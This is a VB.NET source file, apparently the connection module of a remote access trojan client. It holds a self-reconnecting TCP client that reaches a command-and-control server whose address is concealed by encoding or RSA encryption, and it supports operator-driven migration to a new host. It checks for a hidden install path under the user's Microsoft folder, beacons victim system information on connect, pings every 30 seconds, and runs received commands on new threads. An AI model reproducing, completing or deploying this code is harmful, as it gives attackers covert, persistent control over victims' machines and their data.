﻿Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports System.Threading
Imports System.Text

Public Class TCP
    Public SPL As String = DEB(Password)
    Public C As Net.Sockets.TcpClient
    Public tick As System.Threading.Timer = Nothing
    Sub New()
        Dim t As New Threading.Thread(AddressOf RC)
        t.Start()
    End Sub
    Sub Ping()
        Send(ENB("ping"))
    End Sub
    Public Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Private CN As Boolean = False
    Sub RC()
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CN = False Then GoTo e
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New System.Threading.Thread(AddressOf IND)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Thread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
            tick.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0

            If My.Settings.TransferStatus = True Then
                SPL = My.Settings.PW
                C.Client.Connect(My.Settings.NewHost, My.Settings.NewPort)
            Else
                My.Settings.TransferStatus = False
                My.Settings.Save()
            End If
            If EncryptStatus = "True" Then
                C.Client.Connect(DecryptData(DEB(EncryptKey), h), Convert.ToInt32(DecryptData(DEB(EncryptKey), p)))
            ElseIf My.Settings.TransferStatus = False Then
                C.Client.Connect(DEB(h), Convert.ToInt32(DEB(p)))
            End If
            CN = True
            If A.HardInstall = "True" Then
                If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
                    Send(A.ENB("!0") & Y & INF())
                End If
            Else
                Send(A.ENB("!0") & Y & INF())
            End If
            Send(A.ENB("MSG") & Y & "Client is Connected" & Y & "Succ" & Y & "decode")
        Catch ex As Exception
            Thread.Sleep(2500)
            GoTo e
        End Try
        Dim Tt As New TimerCallback(AddressOf Ping)
        tick = New Threading.Timer(Tt, Nothing, 0, 30000)
        GoTo re
    End Sub
    Public Function DecryptData(ByVal privateKeyPath As String, ByVal data2Decrypt As String) As String
        Dim plain As Byte()
        Using rsa As RSACryptoServiceProvider = New RSACryptoServiceProvider(4096)
            rsa.PersistKeyInCsp = False
            Dim encodedCipherText As Byte() = Convert.FromBase64String(data2Decrypt)
            rsa.FromXmlString(privateKeyPath)
            plain = rsa.Decrypt(encodedCipherText, False)
        End Using
        Return Encoding.UTF8.GetString(plain)
    End Function
End Class